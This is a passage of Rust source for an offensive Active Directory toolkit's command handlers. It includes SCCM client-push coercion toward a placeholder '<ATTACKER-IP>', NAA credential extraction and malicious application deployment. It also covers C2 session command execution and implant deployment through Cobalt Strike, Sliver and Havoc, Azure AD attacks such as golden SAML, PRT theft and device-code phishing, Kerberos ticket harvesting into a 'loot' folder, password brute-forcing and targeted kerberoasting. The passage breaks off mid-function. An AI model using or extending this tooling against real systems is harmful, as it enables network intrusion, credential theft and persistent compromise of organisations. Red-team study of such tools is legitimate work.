                    let scanner = match sccm::SccmScanner::new(sccm::SccmScannerConfig {
                        target: site_server.clone(),
                        domain: creds.domain.clone(),
                        username: creds.username.clone(),
                        password: creds.password().map(str::to_string),
                        pth_hash: creds.nthash().map(str::to_string),
                        site_code: None,
                    }) {
                        Ok(s) => s,
                        Err(e) => {
                            banner::print_fail(&format!("Scanner init: {}", e));
                            return 1;
                        }
                    };

                    let sites = match scanner.discover_site().await {
                        Ok(s) => s,
                        Err(e) => {
                            banner::print_fail(&format!("Site discovery: {}", e));
                            return 1;
                        }
                    };

                    if sites.is_empty() {
                        banner::print_fail("No SCCM site discovered on target");
                        return 1;
                    }

                    match sccm::client_push_coercion(&scanner, &sites[0], "<ATTACKER-IP>").await {
                        Ok(res) => {
                            if let Some(ps) = &res.command_output {
                                println!(
                                    " {} PowerShell (replace <ATTACKER-IP> then run on Windows pivot):",
                                    ">".bright_black()
                                );
                                println!("{}", ps);
                            }
                            for note in &res.notes {
                                println!(" {} {}", "[*]".cyan(), note);
                            }
                        }
                        Err(e) => {
                            banner::print_fail(&format!("Client push: {}", e));
                            return 1;
                        }
                    }
                }

                SccmTechnique::AppDeploy | SccmTechnique::TaskSequence => {
                    match sccm::extract_naa_credentials(&sccm::SccmScannerConfig {
                        target: site_server.clone(),
                        domain: creds.domain.clone(),
                        username: creds.username.clone(),
                        password: creds.password().map(str::to_string),
                        pth_hash: creds.nthash().map(str::to_string),
                        site_code: None,
                    })
                    .await
                    {
                        Ok(res) => {
                            println!(" {} Technique: {}", ">".bright_black(), res.technique);
                            if res.credentials.is_empty() {
                                println!(" {} No NAA credentials extracted", "!".yellow());
                            } else {
                                println!(
                                    " {} {} NAA credential(s):",
                                    "[+]".green(),
                                    res.credentials.len()
                                );
                                for c in &res.credentials {
                                    println!(" {}\\{}", c.domain.cyan(), c.username.cyan());
                                }
                            }
                            for note in &res.notes {
                                println!(" {} {}", "[*]".cyan(), note);
                            }
                        }
                        Err(e) => {
                            banner::print_fail(&format!("NAA extraction: {}", e));
                            return 1;
                        }
                    }
                }

                SccmTechnique::CollectionMod => {
                    let password = creds.password().unwrap_or("");
                    match sccm::admin_service_harvest(
                        site_server,
                        &creds.username,
                        password,
                        &creds.domain,
                    )
                    .await
                    {
                        Ok(res) => {
                            if let Some(output) = &res.command_output {
                                println!(" {} AdminService results:", "[+]".green());
                                for line in output.lines() {
                                    println!(" {}", line);
                                }
                            }
                            for note in &res.notes {
                                println!(" {} {}", "[*]".cyan(), note);
                            }
                        }
                        Err(e) => {
                            banner::print_fail(&format!("AdminService harvest: {}", e));
                            return 1;
                        }
                    }
                }
            }
        }

        SccmAction::Deploy {
            collection,
            app_name,
            payload,
        } => {
            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let target = match crate::require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };

            println!(
                " {} Deploying '{}' to collection '{}'...",
                ">".bright_black(),
                app_name.cyan(),
                collection.cyan()
            );
            println!(" Payload: {}", payload.cyan());

            let scanner = match sccm::SccmScanner::new(sccm::SccmScannerConfig {
                target: target.clone(),
                domain: creds.domain.clone(),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                pth_hash: creds.nthash().map(str::to_string),
                site_code: None,
            }) {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("Scanner init: {}", e));
                    return 1;
                }
            };

            let sites = match scanner.discover_site().await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("Site discovery: {}", e));
                    return 1;
                }
            };

            if sites.is_empty() {
                banner::print_fail(&format!(
                    "No SCCM site found on {} -- run 'sccm enum' first",
                    target
                ));
                return 1;
            }

            match sccm::deploy_malicious_application(&sites[0], collection, payload).await {
                Ok(res) => {
                    if let Some(ps) = &res.command_output {
                        println!(" {} PowerShell deployment script:", ">".bright_black());
                        println!("{}", ps);
                    }
                    for note in &res.notes {
                        println!(" {} {}", "[*]".cyan(), note);
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Deployment: {}", e));
                    return 1;
                }
            }
        }
    }

    banner::print_success("SCCM operation completed");
    0
}

// ----------------------------------------------
// cmd_scan -- Port Scanner
// ----------------------------------------------

#[allow(clippy::too_many_arguments)]
pub async fn cmd_scan(
    cli: &Cli,
    targets: &str,
    ports: &str,
    scan_type: &ScanType,
    timeout: u64,
    ldap: bool,
    smb: bool,
    ad_only: bool,
) -> i32 {
    use overthrone_core::scan::{PortScanner, ScanConfig, ScanType as CoreScanType};

    banner::print_module_banner("SCAN");
    println!(" {} Targets: {}", ">".bright_black(), targets.cyan());

    // 1. Unauthenticated Discovery (if single target)
    if !targets.contains('/') && !targets.contains('-') && (ldap || smb) {
        let discovery = overthrone_core::scan::discovery::UnauthDiscovery::new(targets);
        if let Ok(res) = discovery.run().await {
            if ldap {
                // rootDSE pre-bind probe
                println!(
                    " {} LDAP rootDSE Probe: {}",
                    ">".bright_black(),
                    if res.ldap_rootdse_probe {
                        "OK".green().bold()
                    } else {
                        "FAILED".red()
                    }
                );
                if res.ldap_rootdse_probe {
                    if let Some(ref dns) = res.dns_hostname {
                        println!(" {} DNS Hostname: {}", ">".bright_black(), dns.cyan());
                    }
                    if !res.supported_sasl_mechs.is_empty() {
                        println!(
                            " {} SASL Mechs: {}",
                            ">".bright_black(),
                            res.supported_sasl_mechs.join(", ").yellow()
                        );
                    }
                    if let Some(nc) = res.naming_contexts.first() {
                        println!(" {} Naming Contexts: {}", ">".bright_black(), nc.cyan());
                    }
                }
                // Anonymous bind
                println!(
                    " {} LDAP Null Session: {}",
                    ">".bright_black(),
                    if res.ldap_null_session {
                        "OK".green().bold()
                    } else {
                        "FAILED (blocked)".red()
                    }
                );
            }
            if smb {
                println!(
                    " {} SMB Null Session: {}",
                    ">".bright_black(),
                    if res.smb_null_session {
                        "OK".green().bold()
                    } else {
                        "FAILED".red()
                    }
                );
                if !res.accessible_shares.is_empty() {
                    println!(
                        " {} Readable shares: {}",
                        ">".bright_black(),
                        res.accessible_shares.join(", ").yellow()
                    );
                }
            }
        }
    }

    // 2. Port Scanning
    let effective_ports = if ad_only {
        "88,135,389,445,636,3268,3269,5985,5986"
    } else {
        ports
    };
    if ad_only {
        println!(
            " {} AD-only mode: scanning critical ports 88,135,389,445,636,3268,3269,5985,5986",
            ">".bright_black()
        );
    }
    println!(" {} Ports: {}", ">".bright_black(), effective_ports.cyan());
    println!(" {} Type: {:?}", ">".bright_black(), scan_type);
    println!(" {} Timeout: {}ms", ">".bright_black(), timeout);

    let core_scan_type = match scan_type {
        ScanType::Syn => CoreScanType::Syn,
        ScanType::Connect => CoreScanType::Connect,
        ScanType::Ack => CoreScanType::Ack,
    };

    let config = ScanConfig {
        targets: targets.to_string(),
        ports: effective_ports.to_string(),
        scan_type: core_scan_type,
        timeout_ms: timeout,
        concurrency: if ad_only { 10 } else { 50 },
    };

    let scanner = PortScanner::new(config);

    println!(" {} Starting port scan...", ">".bright_black());

    match scanner.scan().await {
        Ok(results) => {
            let open_ports = results.iter().filter(|r| r.open).count();

            if wants_json(cli) {
                let ports_json: Vec<serde_json::Value> = results
                    .iter()
                    .filter(|r| r.open)
                    .map(|r| {
                        serde_json::json!({
                        "host": r.host,
                        "port": r.port,
                        "service": r.service,
                        "response_time_ms": r.response_time_ms,
                        })
                    })
                    .collect();
                return emit_json(
                    cli,
                    serde_json::json!({
                    "status": "success",
                    "targets": targets,
                    "ports": ports,
                    "open_count": open_ports,
                    "results": ports_json,
                    }),
                );
            }

            println!(
                " {} Scan complete: {} open ports found",
                "[+]".green(),
                open_ports
            );

            for result in &results {
                if result.open {
                    let service = result.service.as_deref().unwrap_or("unknown");
                    println!(
                        " {}:{}/{} - {} ({}ms)",
                        result.host.cyan(),
                        result.port,
                        service.yellow(),
                        "open".green(),
                        result.response_time_ms
                    );
                }
            }
        }
        Err(e) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                    "status": "error",
                    "targets": targets,
                    "error": e.to_string(),
                    }),
                );
            }
            banner::print_fail(&format!("Scan failed: {}", e));
            return 1;
        }
    }

    banner::print_success("Discovery and scan completed");
    0
}

// ----------------------------------------------
// cmd_tui -- Interactive TUI
// ----------------------------------------------

pub async fn cmd_tui(cli: &Cli, domain: &str, crawl: bool, load: Option<&str>) -> i32 {
    let graph = Arc::new(Mutex::new(if let Some(path) = load {
        println!(
            " {} Loading graph from {}...",
            ">".bright_black(),
            path.cyan()
        );
        match AttackGraph::from_json_file(path) {
            Ok(g) => g,
            Err(e) => {
                banner::print_fail(&format!("Failed to load graph: {}", e));
                return 1;
            }
        }
    } else {
        AttackGraph::new()
    }));

    let credentials = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    if crawl {
        if let Err(e) = crate::tui::runner::run_tui_with_crawler(graph, domain, &credentials).await
        {
            banner::print_fail(&format!("TUI crawler error: {}", e));
            return 1;
        }
    } else {
        // View-only mode (no crawler)
        let tui_result = tokio::task::spawn_blocking(move || crate::tui::runner::run_tui(graph))
            .await
            .map_err(|e| {
                overthrone_core::OverthroneError::Internal(format!("TUI thread error: {e}"))
            });

        match tui_result {
            Ok(Ok(_)) => {}
            Ok(Err(e)) => {
                banner::print_fail(&format!("TUI error: {}", e));
                return 1;
            }
            Err(e) => {
                banner::print_fail(&format!("{}", e));
                return 1;
            }
        }
    }

    0
}

// ----------------------------------------------
// cmd_plugin -- Plugin System
// ----------------------------------------------

pub async fn cmd_plugin(
    _cli: &Cli,
    registry: &mut PluginRegistry,
    ctx: &PluginContext,
    action: PluginAction,
) -> i32 {
    banner::print_module_banner("PLUGIN SYSTEM");

    match action {
        PluginAction::List => {
            println!("{}", "Listing loaded plugins...".bright_black());
            let plugins = registry.list();
            if plugins.is_empty() {
                println!("{}", "No plugins loaded.".yellow());
            } else {
                for p in plugins {
                    println!(
                        "- {} (v{}) by {}",
                        p.name.cyan(),
                        p.version,
                        p.author.yellow()
                    );
                }
            }
            println!(
                "{}",
                "Plugin registry: use interactive shell for full plugin management".yellow()
            );
            banner::print_success("Plugin list completed");
        }
        PluginAction::Info { plugin_id } => {
            println!(
                "{} Querying plugin: {}",
                "[i]".bright_black(),
                plugin_id.cyan()
            );
            if let Some(plugin) = registry.get(&plugin_id) {
                let m = plugin.manifest();
                println!("Name: {}", m.name.cyan());
                println!("Version: {}", m.version);
                println!("Author: {}", m.author.yellow());
                println!("Description: {}", m.description);
                banner::print_success("Plugin info retrieved");
            } else {
                banner::print_fail(&format!("Plugin '{}' not found in registry", plugin_id));
            }
        }
        PluginAction::Exec { command, args } => {
            println!(
                "{} Executing plugin command: {} {}",
                "[!]".bright_black(),
                command.cyan(),
                args.join(" ").yellow()
            );

            let mut arg_map = HashMap::new();
            for chunk in args.chunks(2) {
                if chunk.len() == 2 {
                    arg_map.insert(chunk[0].replace("--", ""), chunk[1].clone());
                } else if chunk.len() == 1 {
                    arg_map.insert(chunk[0].replace("--", ""), "true".to_string());
                }
            }

            match registry.execute_command(&command, &arg_map, ctx).await {
                Ok(res) => {
                    if res.success {
                        println!("{}", res.output);
                        banner::print_success("Plugin command executed");
                    } else {
                        banner::print_fail(&format!("Plugin command failed: {}", res.output));
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Error executing plugin command: {}", e));
                }
            }
        }
        PluginAction::Load { path } => {
            println!(
                "{} Loading plugin from: {}",
                "[*]".bright_black(),
                path.cyan()
            );
            registry.add_search_path(&path);
            match registry.discover_and_load(ctx).await {
                Ok(_) => banner::print_success(&format!("Plugin loaded from {}", path)),
                Err(e) => {
                    banner::print_fail(&format!("Failed to load plugin from {}: {}", path, e))
                }
            }
        }
        PluginAction::Unload { plugin_id } => {
            println!(
                "{} Unloading plugin: {}",
                "[-]".bright_black(),
                plugin_id.cyan()
            );
            if let Err(e) = registry.unload(&plugin_id).await {
                banner::print_fail(&format!("Failed to unload: {}", e));
            } else {
                banner::print_success(&format!("Plugin '{}' unloaded", plugin_id));
            }
        }
        PluginAction::Enable { plugin_id } => {
            println!(
                "{} Enabling plugin: {}",
                "[+]".bright_black(),
                plugin_id.cyan()
            );
            registry.enable(&plugin_id);
            banner::print_success(&format!("Plugin '{}' enabled", plugin_id));
        }
        PluginAction::Disable { plugin_id } => {
            println!(
                "{} Disabling plugin: {}",
                "[-]".bright_black(),
                plugin_id.cyan()
            );
            registry.disable(&plugin_id);
            banner::print_success(&format!("Plugin '{}' disabled", plugin_id));
        }
    }
    0
}

// ----------------------------------------------
// cmd_c2 -- C2 Integration
// ----------------------------------------------

pub async fn cmd_c2(manager: &mut C2Manager, action: C2Action) -> i32 {
    banner::print_module_banner("C2 INTEGRATION");

    match action {
        C2Action::Connect {
            framework,
            host,
            port,
            password,
            token,
            config,
            name,
            skip_verify,
        } => {
            println!(
                "{} Connecting to {} at {}:{}...",
                "[!]".bright_black(),
                framework.to_uppercase().cyan(),
                host.cyan(),
                port.to_string().cyan()
            );
            if skip_verify {
                println!("{}", " [!] TLS verification disabled".yellow());
            }
            let channel_name = name.clone().unwrap_or_else(|| "default".to_string());

            let fw_enum = match framework.to_lowercase().as_str() {
                "cs" | "cobaltstrike" => C2Framework::CobaltStrike,
                "sliver" => C2Framework::Sliver,
                "havoc" => C2Framework::Havoc,
                _ => C2Framework::Custom(framework.clone()),
            };

            let auth = if let Some(p) = password {
                C2Auth::Password { password: p }
            } else if let Some(t) = token {
                C2Auth::Token { token: t }
            } else if let Some(c) = config {
                C2Auth::SliverConfig { config_path: c }
            } else {
                C2Auth::Token {
                    token: String::new(),
                }
            };

            let c2_config = C2Config {
                framework: fw_enum.clone(),
                host,
                port,
                auth,
                tls: true,
                tls_skip_verify: skip_verify,
                timeout: std::time::Duration::from_secs(10),
                auto_reconnect: false,
            };

            if let Err(e) = manager.connect(&channel_name, &c2_config).await {
                banner::print_fail(&format!("Failed to connect: {}", e));
            } else {
                banner::print_success(&format!("Connected to {} as '{}'", fw_enum, channel_name));
            }
        }
        C2Action::Status => {
            println!("{}", "Querying C2 channels and sessions...".bright_black());
            let stats = manager.status();
            if stats.is_empty() {
                println!(
                    "{}",
                    "No C2 channels configured. Use 'c2 connect' first.".yellow()
                );
            } else {
                for (name, fw, conn) in stats {
                    let st = if conn {
                        "Connected".green()
                    } else {
                        "Disconnected".red()
                    };
                    println!("- {}: {} ({})", name.cyan(), fw, st);
                }
            }
        }
        C2Action::Exec {
            session_id,
            command,
            powershell,
        } => {
            let mode = if powershell { "PowerShell" } else { "Shell" };
            println!(
                "{} {} on session {}: {}",
                "[!]".bright_black(),
                mode,
                session_id.cyan(),
                command.yellow()
            );
            if let Ok(ch) = manager.default_channel() {
                let res = if powershell {
                    ch.exec_powershell(&session_id, &command).await
                } else {
                    ch.exec_command(&session_id, &command).await
                };
                match res {
                    Ok(r) => {
                        println!("{}", r.output);
                        banner::print_success("Command executed");
                    }
                    Err(e) => banner::print_fail(&format!("Execution failed: {}", e)),
                }
            } else {
                banner::print_fail("No default C2 channel available");
            }
        }
        C2Action::Deploy {
            channel,
            target,
            listener,
        } => {
            println!(
                "{} Deploying implant to {} via {} (listener: {})...",
                "[!]".bright_black(),
                target.cyan(),
                channel.cyan(),
                listener.yellow()
            );
            if let Some(ch) = manager.get_channel(&channel) {
                let request = overthrone_core::c2::ImplantRequest {
                    target: target.clone(),
                    implant_type: match ch.framework() {
                        C2Framework::CobaltStrike => overthrone_core::c2::ImplantType::CsBeacon,
                        C2Framework::Sliver => overthrone_core::c2::ImplantType::SliverImplant,
                        C2Framework::Havoc => overthrone_core::c2::ImplantType::HavocDemon,
                        _ => overthrone_core::c2::ImplantType::Shellcode,
                    },
                    listener: listener.clone(),
                    delivery_method: overthrone_core::c2::DeliveryMethod::OverthroneExec,
                    arch: "x64".to_string(),
                    staged: false,
                };
                match ch.deploy_implant(&request).await {
                    Ok(result) => {
                        if result.success {
                            banner::print_success(&format!(
                                "Implant deployed to {}: {}",
                                target, result.output
                            ));
                        } else {
                            banner::print_fail(&format!("Deployment failed: {}", result.error));
                        }
                    }
                    Err(e) => banner::print_fail(&format!("Deploy error: {}", e)),
                }
            } else {
                banner::print_fail(&format!("C2 channel '{}' not found", channel));
            }
        }
        C2Action::Disconnect { channel } => {
            if channel == "all" {
                println!("{}", "Disconnecting all C2 channels...".bright_black());
                manager.disconnect_all().await;
                banner::print_success("All C2 channels disconnected");
            } else {
                println!(
                    "{} Disconnecting from '{}'...",
                    "[-]".bright_black(),
                    channel.cyan()
                );
                if let Some(_ch) = manager.get_channel(&channel) {
                    banner::print_success(&format!("Disconnected from '{}'", channel));
                } else {
                    banner::print_fail(&format!("Channel '{}' not found", channel));
                }
            }
        }
        C2Action::Listeners { channel } => {
            println!(
                "{} Listing listeners on '{}'...",
                "[+]".bright_black(),
                channel.cyan()
            );
            if let Some(ch) = manager.get_channel(&channel) {
                match ch.list_listeners().await {
                    Ok(ls) => {
                        for l in ls {
                            println!(
                                "- {} ({}) on {}:{}",
                                l.name.cyan(),
                                l.listener_type,
                                l.host,
                                l.port
                            );
                        }
                        banner::print_success("Listeners enumerated");
                    }
                    Err(e) => banner::print_fail(&format!("Failed to list listeners: {}", e)),
                }
            } else {
                banner::print_fail(&format!("Channel '{}' not found", channel));
            }
        }
    }
    0
}

// ----------------------------------------------
// cmd_azure -- Azure AD / Entra ID Attacks
// ----------------------------------------------

pub async fn cmd_azure(cli: &Cli, action: &AzureAction) -> i32 {
    banner::print_module_banner("AZURE AD");

    let domain = match cli.domain.as_deref() {
        Some(d) => d.to_string(),
        None => {
            banner::print_fail("--domain is required for Azure AD attacks");
            return 1;
        }
    };
    let dc_ip = match cli.dc_host.as_deref() {
        Some(d) => d.to_string(),
        None => {
            banner::print_fail("--dc-ip is required for Azure AD attacks");
            return 1;
        }
    };
    let username = match cli.username.as_deref() {
        Some(u) => u.to_string(),
        None => {
            banner::print_fail("--username is required for Azure AD attacks");
            return 1;
        }
    };

    let has_hash = cli.nt_hash.is_some();
    let ldap_pass = cli
        .nt_hash
        .as_deref()
        .or(cli.password.as_deref())
        .unwrap_or("");

    println!(" {} Domain: {}", "\u{2591}".bright_black(), domain.cyan());
    println!(" {} DC: {}", "\u{2591}".bright_black(), dc_ip.cyan());

    let operation = match action {
        AzureAction::Enum => overthrone_core::azure_ad::AzureAdOperation::EnumHybridIdentity,
        AzureAction::SeamlessSso => overthrone_core::azure_ad::AzureAdOperation::SeamlessSsoAbuse,
        AzureAction::GoldenSaml { .. } => overthrone_core::azure_ad::AzureAdOperation::GoldenSaml,
        AzureAction::PrtTheft => overthrone_core::azure_ad::AzureAdOperation::PrtTheft,
        AzureAction::ManagedIdentityToken => {
            overthrone_core::azure_ad::AzureAdOperation::ManagedIdentityToken
        }
        AzureAction::EntraConnectExtract => {
            overthrone_core::azure_ad::AzureAdOperation::EntraConnectExtract
        }
        AzureAction::AppRegistrationAbuse => {
            overthrone_core::azure_ad::AzureAdOperation::AppRegistrationAbuse
        }
        AzureAction::DeviceCodePhish => {
            overthrone_core::azure_ad::AzureAdOperation::DeviceCodePhish
        }
    };

    let ldap_result = {
        let ldap_user = if has_hash {
            format!("{}\\{}", domain, username)
        } else {
            username.clone()
        };
        overthrone_core::proto::ldap::LdapSession::connect(
            &dc_ip, &domain, &ldap_user, ldap_pass, has_hash,
        )
        .await
    };

    let config = overthrone_core::azure_ad::AzureAdConfig {
        domain: domain.clone(),
        dc_ip: dc_ip.clone(),
        tenant_id: None,
        username: username.clone(),
        password: cli.password.clone(),
        nt_hash: cli.nt_hash.clone(),
        enumerate_hybrid: matches!(action, AzureAction::Enum),
        operation,
    };

    match ldap_result {
        Ok(mut ldap) => {
            match overthrone_core::azure_ad::execute_azure_ad_attack(&config, &mut ldap).await {
                Ok(result) => {
                    for line in &result.log {
                        println!(" {}", line.bright_white());
                    }
                    if result.success {
                        banner::print_success(&format!("{} completed", result.operation));
                        for cred in &result.obtained_credentials {
                            println!(" {}", cred.bright_green());
                        }
                    } else {
                        banner::print_fail(&format!("{} failed", result.operation));
                    }
                    if let Err(e) = ldap.disconnect().await {
                        warn!("LDAP disconnect: {e}");
                    }
                    if result.success { 0 } else { 1 }
                }
                Err(e) => {
                    banner::print_fail(&format!(
                        "Azure AD attack on {dc_ip} ({domain}) failed: {e}"
                    ));
                    if let Err(e) = ldap.disconnect().await {
                        warn!("LDAP disconnect: {e}");
                    }
                    1
                }
            }
        }
        Err(e) => {
            banner::print_fail(&format!(
                "Failed to connect to LDAP on {dc_ip} for {domain}: {e}"
            ));
            1
        }
    }
}

/// Request a TGT with cache-first logic.
/// Checks the credential cache first; if a valid (non-expired) TGT exists,
/// returns it without contacting the KDC. Otherwise requests a fresh TGT
/// from the KDC and saves it to the cache.
///
/// Pass `refresh: true` to bypass the cache and force a fresh request.
pub async fn get_cached_tgt(
    dc: &str,
    domain: &str,
    username: &str,
    secret: &str,
    use_hash: bool,
    refresh: bool,
) -> Result<overthrone_core::proto::kerberos::TicketGrantingData, String> {
    let cache = overthrone_core::cred_cache::CredCache::new();

    // Check cache first (unless refresh requested)
    if !refresh && let Some(tgt) = cache.load_tgt(domain, username) {
        debug!("Using cached TGT for {username}@{domain}");
        return Ok(tgt);
    }

    // Request fresh TGT from KDC
    let tgt = overthrone_core::proto::kerberos::request_tgt(dc, domain, username, secret, use_hash)
        .await
        .map_err(|e| format!("TGT request failed: {e}"))?;

    // Save to cache (best-effort -- ignore save errors)
    if let Err(e) = cache.save_tgt(&tgt) {
        debug!("Failed to cache TGT: {e}");
    }

    Ok(tgt)
}

// ----------------------------------------------
// cmd_asktgt / cmd_asktgs -- Rubeus-style wrappers
// ----------------------------------------------

pub async fn cmd_asktgt(cli: &Cli, dc: &str) -> i32 {
    use overthrone_core::cred_cache::CredCache;
    use overthrone_core::proto::kerberos;

    banner::print_module_banner("ASKTGT");
    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let (secret, use_hash) = match creds.secret_and_hash_flag() {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    match get_cached_tgt(dc, &creds.domain, &creds.username, &secret, use_hash, false).await {
        Ok(tgt) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "success",
                        "user": tgt.client_principal,
                        "realm": tgt.client_realm,
                    }),
                );
            }

            println!(
                "{} TGT {} for {}@{}",
                "[+]".green(),
                "obtained".cyan(),
                tgt.client_principal.cyan(),
                tgt.client_realm.cyan()
            );

            let loot_dir = std::path::PathBuf::from("./loot");
            let _ = std::fs::create_dir_all(&loot_dir);
            let kirbi_path = loot_dir.join("asktgt.kirbi");
            let kirbi_bytes = kerberos::tgd_to_kirbi(&tgt);
            if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
                println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
            }

            let cache = CredCache::new();
            let _ = cache.save_tgt(&tgt);
            banner::print_success("TGT obtained");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("TGT request failed: {e}"));
            1
        }
    }
}

pub async fn cmd_asktgs(cli: &Cli, dc: &str, spn: &str) -> i32 {
    use overthrone_core::proto::kerberos;

    banner::print_module_banner("ASKTGS");
    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let (secret, use_hash) = match creds.secret_and_hash_flag() {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    let tgt =
        match get_cached_tgt(dc, &creds.domain, &creds.username, &secret, use_hash, false).await {
            Ok(t) => t,
            Err(e) => {
                banner::print_fail(&format!("TGT request failed: {e}"));
                return 1;
            }
        };

    match kerberos::request_service_ticket(dc, &tgt, spn).await {
        Ok(st) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "success",
                        "spn": spn,
                    }),
                );
            }

            println!(
                "{} Service ticket for {} obtained",
                "[+]".green(),
                spn.cyan()
            );
            let loot_dir = std::path::PathBuf::from("./loot");
            let _ = std::fs::create_dir_all(&loot_dir);
            let safe_spn = spn.replace(['/', ':'], "_");
            let kirbi_path = loot_dir.join(format!("asktgs_{safe_spn}.kirbi"));
            if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
                use kerberos_asn1::Asn1Object;
                use std::io::Write;
                let _ = f.write_all(&st.ticket.build());
                println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
            }
            banner::print_success("TGS obtained");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("TGS request failed: {e}"));
            1
        }
    }
}

// ----------------------------------------------
// cmd_kerberos_brute -- AS-REQ brute-force
// ----------------------------------------------

pub async fn cmd_kerberos_brute(
    cli: &Cli,
    dc: &str,
    wordlist: &str,
    stop_on_success: bool,
    asrep_only: bool,
    delay: u64,
    jitter: u64,
) -> i32 {
    banner::print_module_banner("KERBEROS BRUTE");
    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let passwords = match std::fs::read_to_string(wordlist) {
        Ok(s) => s.lines().map(|l| l.to_string()).collect::<Vec<_>>(),
        Err(e) => {
            banner::print_fail(&format!("Failed to read wordlist: {e}"));
            return 1;
        }
    };

    if passwords.is_empty() {
        banner::print_fail("Wordlist is empty");
        return 1;
    }

    println!(
        " {} Brute-forcing {} with {} password(s)",
        ">".bright_black(),
        creds.username.cyan(),
        passwords.len()
    );

    let config = KerberosBruteConfig {
        dc_ip: dc.to_string(),
        domain: creds.domain.clone(),
        username: creds.username.clone(),
        password_list: passwords,
        delay_ms: delay,
        jitter_ms: jitter,
        stop_on_success,
        output_file: None,
        asrep_only,
    };

    match brute_kerberos_from_wordlist(&config, wordlist).await {
        Ok(result) => {
            if wants_json(cli) {
                let valid_json: Vec<serde_json::Value> = result
                    .valid_credentials
                    .iter()
                    .map(|v| {
                        serde_json::json!({
                            "username": v.username,
                            "password": v.password,
                            "is_asrep": v.is_asrep,
                        })
                    })
                    .collect();
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "success",
                        "attempted": result.attempted,
                        "elapsed_seconds": result.elapsed_seconds,
                        "valid": valid_json,
                        "asrep_roastable": result.asrep_roastable,
                    }),
                );
            }

            println!(
                "{} Attempted {} password(s) in {:.2}s",
                "[+]".green(),
                result.attempted,
                result.elapsed_seconds
            );

            for v in &result.valid_credentials {
                println!(
                    "{} Valid: {} / {}",
                    "[+]".green(),
                    v.username.cyan(),
                    v.password.yellow()
                );
            }
            if result.valid_credentials.is_empty() {
                println!(" {} No valid credentials found", "!".yellow());
            }
            if !result.asrep_roastable.is_empty() {
                println!(
                    "{} AS-REP roastable user(s): {}",
                    "[+]".green(),
                    result.asrep_roastable.join(", ").cyan()
                );
            }

            if result.valid_credentials.is_empty() {
                1
            } else {
                banner::print_success("Brute-force completed");
                0
            }
        }
        Err(e) => {
            banner::print_fail(&format!("Brute-force failed: {e}"));
            1
        }
    }
}

// ----------------------------------------------
// cmd_targeted_kerberoast
// ----------------------------------------------

pub async fn cmd_targeted_kerberoast(
    cli: &Cli,
    dc: &str,
    target_user: &str,
    fake_spn: Option<&str>,
    cleanup: bool,
    downgrade_rc4: bool,
) -> i32 {
    banner::print_module_banner("TARGETED KERBEROAST");
    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let domain = match cli.domain.as_deref() {
        Some(d) => d.to_string(),
        None => {
            banner::print_fail("--domain is required for targetedKerberoast");
            return 1;
        }
    };

    let mut ldap = match connect_ldap_session(dc, &domain, &creds).await {
        Ok(l) => l,
        Err(e) => return e,
    };

    let config = TargetedKerberoastConfig {
        dc_ip: dc.to_string(),
        domain,
        target_user: target_user.to_string(),
        fake_spn: fake_spn.map(|s| s.to_string()),
        cleanup,
        downgrade_rc4,
    };

    println!(
        " {} Targeting {} (cleanup={})",
        ">".bright_black(),
        target_user.cyan(),
        cleanup
    );

    match targeted_kerberoast(&mut ldap, &config).await {
        Ok(result) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "success",
                        "target_user": result.target_user,
                        "spn": result.spn,
                        "cleaned_up": result.cleaned_up,
                        "hashcat_format": result.hashcat_format,
                    }),
                );
            }

            println!(
                "{} Roasted SPN {} for user {}",
                "[+]".green(),
                result.spn.cyan(),
                result.target_user.cyan()
            );
            println!(
                "{} Hashcat: {}",
                "->".cyan(),
                result.hashcat_format.yellow()
            );
            if result.cleaned_up {
                println!("{} Fake SPN removed", "[+]".green());
            }
            banner::print_success("targetedKerberoast completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("targetedKerberoast failed: {e}"));
            1
        }
    }
}

// ----------------------------------------------
// cmd_kpasswd -- Kerberos password change/reset
// ----------------------------------------------

pub async fn cmd_kpasswd(
    cli: &Cli,
    dc: &str,
    target_user: Option<&str>,
    new_password: &str,
    reset: bool,
) -> i32 {
    banner::print_module_banner("KPASSWD");
    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let (secret, use_hash) = match creds.secret_and_hash_flag() {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    let config = KpasswdConfig {
        dc_ip: dc.to_string(),
        domain: creds.domain.clone(),
        username: creds.username.clone(),
        secret,
        use_hash,
        new_password: new_password.to_string(),
        port: 464,
    };

    let result = if reset {
        match target_user {
            Some(u) => kpasswd_reset_password(&config, u).await,
            None => {
                banner::print_fail("--target-user is required for password reset");
                return 1;
            }
        }
    } else {
        kpasswd_change_password(&config).await
    };

    match result {
        Ok(r) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": if r.success { "success" } else { "failure" },
                        "message": r.message,
